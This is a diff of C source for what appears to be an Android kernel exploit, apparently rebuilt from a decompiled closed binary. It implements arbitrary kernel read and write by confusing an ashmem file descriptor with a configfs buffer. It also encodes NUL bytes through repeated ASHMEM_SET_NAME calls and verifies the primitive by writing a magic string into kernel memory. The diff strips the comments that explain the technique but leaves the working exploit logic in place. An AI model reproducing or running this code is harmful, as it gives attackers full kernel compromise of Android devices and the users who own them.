@@ -1,3 +1,8 @@
+/*
+ * Implements the initial kernel read/write primitive through an ashmem
+ * file-descriptor type confusion. Encodes control bytes with ASHMEM_SET_NAME
+ * and uses positioned I/O to access target addresses.
+ */
 #define _GNU_SOURCE
 #include <dirent.h>
 #include <errno.h>
@@ -11,16 +16,13 @@
 #include "08_ashmem_configfs_rw.h"
 #include "90_diagnostic_checkpoint.h"
 
-#define OSS_ASHMEM_OPEN_FLAGS (O_RDWR | O_CLOEXEC) /* 0x80002, matches FUN_00105968 */
+#define OSS_ASHMEM_OPEN_FLAGS (O_RDWR | O_CLOEXEC)
 #define OSS_ASHMEM_PATH_SIZE 0x100
 #define OSS_ASHMEM_NAME_LEN 0x100
 #define OSS_ASHMEM_SET_NAME 0x41007701UL
 #define OSS_CONFIGFS_CONTROL_LEN 0x80
 #define OSS_CONFIGFS_COUNT 0x6d6873612f766564ULL /* "dev/ashm" */
 
-/* FUN_001057e0 resolves an openable alias before exploitation and stores it
- * in the writable buffer later consumed by FUN_00105968. Android exposes a
- * boot-id alias with ashmem_libcutils_device labeling to shell callers. */
 static char g_ashmem_path[OSS_ASHMEM_PATH_SIZE] = "/dev/ashmem";
 static int g_ashmem_path_state;
 
@@ -82,8 +84,6 @@ int oss_prepare_kernel_rw_path(void) {
     closedir(dev);
   }
 
-  /* The writable buffer starts as "/dev/ashmem" in the closed binary.
-   * Accept that fallback only when this caller can actually open it. */
   if (canonical_ok && S_ISCHR(canonical.st_mode) &&
       select_openable_ashmem_path("/dev/ashmem")) {
     g_ashmem_path_state = 1;
@@ -109,10 +109,6 @@ int oss_open_kernel_rw(void) {
   return fd;
 }
 
-/* FUN_00105e28/FUN_00105e84. ASHMEM_SET_NAME accepts a C string, while the
- * confused configfs_buffer needs embedded NUL bytes. First write every byte
- * with 0/1 mapped to 1, then replay successively shorter prefixes for each
- * intended NUL, from the end toward the start. */
 static int set_name_prefix(int fd, const unsigned char *src, size_t len) {
   if (len >= OSS_ASHMEM_NAME_LEN) {
     errno = EINVAL;
@@ -153,11 +149,7 @@ static uint64_t next_nonzero_bytes(uint64_t value) {
 }
 
 int oss_kernel_read(int fd, uint64_t target_addr, void *buf, size_t len) {
-  /* FUN_00107138. ashmem_area.name begins with the fixed 11-byte prefix
-   * "dev/ashmem/". User-name offset 5 therefore aliases
-   * configfs_buffer.page at offset 16. Pick a huge positive file position
-   * whose subtraction yields a pointer with no NUL bytes, then materialize
-   * the remaining zero fields through the staged SET_NAME encoder above. */
+
   unsigned char control[OSS_CONFIGFS_CONTROL_LEN];
   uint64_t offset = 0;
   int configured = 0;
@@ -219,10 +211,7 @@ int oss_kernel_read(int fd, uint64_t target_addr, void *buf, size_t len) {
 
 int oss_kernel_write(int fd, uint64_t target_addr, const void *buf,
                       size_t len) {
-  /* FUN_00107058. User-name offsets 0x4d/0x55/0x59 alias
-   * configfs_buffer.bin_buffer/bin_buffer_size/cb_max_size. A 16-MiB-aligned
-   * base plus the low 24-bit pwrite offset reaches the exact target without
-   * entering configfs's allocation path. */
+
   uint64_t low = target_addr & 0xffffffULL;
   uint64_t end = low + len;
   if ((end >> 31) != 0) {
@@ -284,10 +273,6 @@ int oss_verify_kernel_access_ex(int fd, uint64_t ashmem_misc_fops_addr,
     return 0;
   }
 
-  /* A fresh original ashmem fd has size zero, so its native read_iter
-   * cannot return this full eight-byte kernel-address read. A full transfer
-   * already proves that the global fops changed; suppress retries even if
-   * the value reveals a wrong landing. */
   if (landed) {
     __atomic_store_n(landed, 1, __ATOMIC_RELEASE);
   }
@@ -303,9 +288,6 @@ int oss_verify_kernel_access_ex(int fd, uint64_t ashmem_misc_fops_addr,
   }
   oss_diag_checkpoint("aar-fops-verified");
 
-  /* source: .rodata string at file offset 0x1b43 in the closed .so,
-   * pulled verbatim via `r2 -qc iz` (34 chars + NUL = 35 = 0x23,
-   * matches the decompile's literal length constant). */
   static const char magic[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
   uint64_t scratch = page_base | 0x2180ULL;
   if (!oss_kernel_write(fd, scratch, magic, sizeof(magic))) {
